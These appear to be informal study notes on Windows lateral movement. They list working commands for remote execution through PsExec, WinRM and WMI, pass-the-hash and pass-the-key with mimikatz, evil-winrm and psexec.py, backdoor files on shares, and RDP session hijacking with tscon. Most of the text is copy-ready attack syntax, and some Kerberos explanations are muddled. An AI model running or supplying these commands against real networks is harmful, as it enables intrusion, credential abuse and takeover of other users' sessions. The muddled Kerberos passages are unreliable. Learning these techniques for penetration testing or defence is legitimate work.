lateral movement allow to move from one computer to an other to bypass firewll or access to some specific network .

to do movement we use Admin account there are 2 type of admin account : 
- Local Account  : can't connect to a remote machine or do network priviledge task
- Domain Account : allow to do what he wnts

# use EXE Process Remotely

to do it we need to be in the admin account .

## psexec64


we will use psexec64.exe that allow to create a pipe to cmd on the remote host .
this software is a part of sysinternal tools 

psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe

# WinRm 

allow to send powershell command to manage user. this is actiated by default . 

winrs.exe -u:{User} -p:{pass} -r:{target ip} cmd

or in powershell 

$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
Enter-PSSession -Computername TARGET -Credential $credential

# other way 

use a schedular or a service to launch remote shell is a possibility too .


# use WMI 

we can use WMI to run command on the other machine : 
## POWERSHELL : 
to use wmi with powersehll we need to create a credential object with the credential of the admin 

$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

after that we need to create a session :

$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop

and for finish we can install our command :

$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}

the command allow us to create a service, a schedular task or a msi .


# NTLM 

## PAss The Hash 

when collect some credential we will get plaintext pass or hash crackable . 
but sometimes we have a uncrackable hash, what we need to do in this case ? 

we can use the hash even if we don t have the password in clear text. 
to do that we use mimikatz to inject the hash in the challenge . 

token::revert
sekurlsa::pth /user:{user} /domain:{domain} /ntlm:{hash} /run:{cmd}

with reerdp:

xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH

or PtH:
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP

or winrm:

evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH


# Kerberos 

Kerberos generate a tocket to give auth . 
there is a TGT (Gold Ticket to allow the DC to know me) and for each service I want I ask the DC with my TGT to give me TGS for the speciic service.

by doing so if I have access to the TGT ticket I don't need the pass.

mimikatz allow to inject the ticket and export them .

this know as Pass-The-Key Attack .

with mimikatz we do by : 

privilege::debug
privilege::debug

sekurlsa::pth /user:{User} /domain:{domain} /{rc4/aes128/aes256}:{key} /run:cmd

# Abusing Privilege :

## Backdoor file 

If we have write access to network file share we can upload some sofware or some script with executable if a user click on it . 

## RDP :

if a user make a RDP connection but not close the RDP session (just close the client). we can use this session without passowrd . 

to do that we use PSExec the systool with:

PsExec64.exe -s cmd.exe

and we can check open rdp with 
query user

and open the rdp with :

tscon {session id to hack} /dest:{our session name}

